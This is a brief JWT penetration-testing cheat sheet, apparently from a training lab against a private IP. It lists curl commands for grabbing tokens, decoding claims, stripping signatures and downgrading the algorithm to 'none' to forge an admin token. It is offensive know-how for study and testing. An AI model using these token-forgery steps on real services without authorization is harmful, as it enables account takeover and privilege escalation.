# JSON Web Tokens JWT Penetration Testing

## Tools: Burpsuite, cURL, https://jwt.io/ (JWT Decoder and editor), Cyberchef https://gchq.github.io/CyberChef/

## Attacks:

### 1) Sensitive Information Disclosure

 - curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.190.243/api/v1.0/example1 (Authenticate with a user and grab the JWT token from that user)

### Go to jwt.io to decode the token and check the values inside the claim portion of the token. We may find sensitive information like internal resources, etc.

### 2) Signature is not verified

 - curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.190.243/api/v1.0/example1 (Grab the JWT token)

 - curl -H 'Authorization: Bearer JWT_TOKEN' http://10.10.190.243/api/v1.0/example2?username=user (Authenticate with the JWT token)

### Go to jwt.io and try to verify the user WITHOUT the signature by removing the signature part leaving ONLY the dot (.).

### Try to authenticate with the SIGNATURELESS token again to check if you can verify the user even without the signature.

### Modify any values we may find in the token. Example:

#### Change the admin value from 0 to 1, then verify as admin with the newly modified JWT token.

 - curl -H 'Authorization: Bearer MODIFIED_SIGNATURELESS_JWT_TOKEN' http://10.10.190.243/api/v1.0/example2?username=admin


### 3) Signature algorithm downgrade to NONE

 - curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.10.190.243/api/v1.0/example3 (Grab the JWT Token)

 - curl -H 'Authorization: Bearer JWT_TOKEN' http://10.10.190.243/api/v1.0/example2?username=user (Authenticate with the JWT Token)

### Go to jwt.io to modify the values inside the claim portion of the token: Admin from 0 to 1 for example.

 - curl -H 'Authorization: Bearer MODIFIED_JWT_TOKEN' http://10.10.190.243/api/v1.0/example2?username=admin

### If the response of the server contains: "Signature verification failed" we can go for the downgrade attack to None algorithm.

### Go to cyberchef, then take the HEADER part of the JWT token and use the JWT decode recipe to get the plain text of the JWT header.

### Grab the plain text JWT header, change the Alg to None and encode it with base64.

### After this, put the base64 encoded header we just made at the BEGINNING of our modified JWT token to replace the previous header with the None algorithm.

 - curl -H 'Authorization: Bearer ALG_NONE_HEADER_MODIFIED_JWT_TOKEN' http://10.10.190.243/api/v1.0/example2?username=admin (Get admin access)


